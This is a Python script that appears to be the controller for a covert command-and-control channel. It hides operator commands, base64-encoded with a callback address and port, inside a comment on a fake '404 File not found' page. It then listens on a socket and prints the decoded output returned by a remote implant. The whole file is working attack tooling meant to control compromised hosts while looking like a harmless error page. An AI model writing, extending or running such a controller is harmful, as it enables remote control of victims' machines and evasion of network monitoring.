#!/usr/bin/python3
import base64
import random
import socket
import struct

def reset():
    text = '''<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
    </body>
</html>'''
    with open("404.html",'w') as f:
        f.write(text)

def recv_msg(sock):
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    return recvall(sock, msglen)

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def write404():
    host = "127.0.0.1"
    port = random.randint(20000, 65535)
    while True:
        reset()
        wait = False
        cmd = input("Input the command you wish to run: ")
        if cmd == "quit":
            return 0
        elif cmd != '':
            text = '''<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
    </body>\n'''
            text += "<!-- "+base64.b64encode(str.encode(cmd+"#!"+host+"#!"+str(port))).decode()+" -->\n"
            text += "</html>"
            wait = True
            with open("404.html",'w') as f:
                f.write(text)
        if wait:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                result = None
                while result is None:
                    try:
                        s.bind((host, port))
                        result = 1
                    except OSError as e:
                        print("Port taken, retrying")
                        port = random.randint(20000, 65535)
                s.listen()
                conn, addr = s.accept()
                print('Connected by', addr)
                data = recv_msg(conn)
                print(base64.b64decode(data).decode())
                s.shutdown(socket.SHUT_RDWR)
                s.close()
                port = random.randint(20000, 65535)

if __name__ == "__main__":
    write404()
